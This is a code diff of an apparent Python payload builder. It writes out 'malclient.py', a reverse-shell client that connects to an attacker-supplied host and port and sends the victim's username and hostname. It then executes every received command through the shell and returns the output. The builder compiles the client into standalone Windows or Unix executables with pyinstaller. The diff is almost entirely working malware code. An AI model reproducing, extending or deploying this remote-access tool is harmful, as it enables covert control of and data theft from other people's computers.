@@ -19,6 +19,16 @@ def remove_paths(paths):
         else:
             print(f"Path {path} does not exist or is not a valid file/directory.")
 
+def MoveExecutable(osTarget:str, unixPorts):
+    # run a system command to run pyinstaller
+    os.system('pyinstaller --onefile malclient.py')
+
+    if osTarget.lower() not in unixPorts:
+        shutil.move("dist/malclient.exe", ".")
+        print("[+] Created malclient.exe! (Windows Executable)")
+    else:
+        shutil.move("dist/malclient", ".")
+        print("[+] Created malclient! (Unix Executable)")
 
 def CreateScript(lhost:str,lport:str,osTarget:str):
     # create target lists
@@ -32,53 +42,59 @@ def CreateScript(lhost:str,lport:str,osTarget:str):
         print(f"[-] {osTarget.lower()} is not a valid target OS")
         return False
     
-    baseScript = f"""
-import socket
-import os
-import threading
-import subprocess
+    baseScript = f"""import socket,threading,subprocess,os
 
 CONNECTIONENDED = True
+sysInfo = ""
 
 def ListenToServer(server):
-    global CONNECTIONENDED
+    global CONNECTIONENDED,sysInfo
+    sent = False
     try:
-        while CONNECTIONENDED == False:
-            recvBuffer = server.recv(4096)
-            os.system(server.recv.decode())
+        while CONNECTIONENDED:
+            recvBuffer = server.recv(4096).decode()
+            if recvBuffer == \"\\n\":
+                if sent == False:
+                    server.sendall(sysInfo.encode())
+                    sent = True
+            elif recvBuffer == \"dtor\":
+                CONNECTIONENDED = False
+                server.close()
+            resproc = subprocess.run(recvBuffer, text=True, capture_output=True, shell=True)
+            res = recvBuffer + str(resproc.stdout)
+            server.sendall(res.encode())
     except Exception as e:
-        server.close()
         CONNECTIONENDED = False
+        print(f\"Client Error: {{e}}\")
+        server.close()
 
 def StartClient():
     clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    global CONNECTIONENDED
+    global CONNECTIONENDED,sysInfo
 
     try:
         clientsocket.connect((\"{lhost}\", {lport}))
 
-        # Turn on listener
-        serverListener = threading.Thread(target=ListenToServer, args=[clientsocket])
-        serverListener.start()
-
         # Send system info
-        sysInfo = ""
         if os.name == 'nt':
             sysInfo = \"{{\\\"os\\\":\\\"Windows\\\",\\\"user\\\":{{\\\"\\\\" + subprocess.check_output('whoami', text=True).strip() + \"\\"}}\" + \"}}\"
         elif os.name == 'posix':
             sysInfo = \"{{\\\"os\\\":\\\"Windows\\\",\\\"user\\\":{{\\\"\\\\" + subprocess.check_output(['echo \\\"$(hostname)\\$(whoami)\\\"'], text=True).strip() + \"\\"}}\" + \"}}\"
 
-        clientsocket.send(sysInfo.encode())
-        clientsocket.recv(64)
+        # Turn on listener
+        serverListener = threading.Thread(target=ListenToServer, args=[clientsocket])
+        serverListener.start()
 
         serverListener.join()
 
     except Exception as e:
         CONNECTIONENDED = False
+        print(f\"Client Connect Error: {{e}}\")
         clientsocket.close()
 
 def main():
     StartClient()
+    print(\"Program Ended\")
 
 if __name__ == "__main__":
     main()
@@ -89,17 +105,8 @@ if __name__ == "__main__":
     print(f"[+] Created malclient.py")
     print("[*] Building portable executable. . .")
 
-    # run a system command to run pyinstaller
-    os.system('pyinstaller --onefile malclient.py')
-
-    if osTarget.lower() not in unixPorts:
-        shutil.move("dist/malclient.exe", ".")
-        print("[+] Created malclient.exe! (Windows Executable)")
-    else:
-        shutil.move("dist/malclient", ".")
-        print("[+] Created malclient! (Unix Executable)")
-
-    # perform clean_up
-    remove_paths(['__pycache__', 'build', 'dist', 'malclient.spec'])
+    remove_paths(['malclient', 'malclient.exe', 'malclient.spec'])
+    MoveExecutable(osTarget,unixPorts)
+    remove_paths(['__pycache__', 'build', 'dist'])
 
     return True
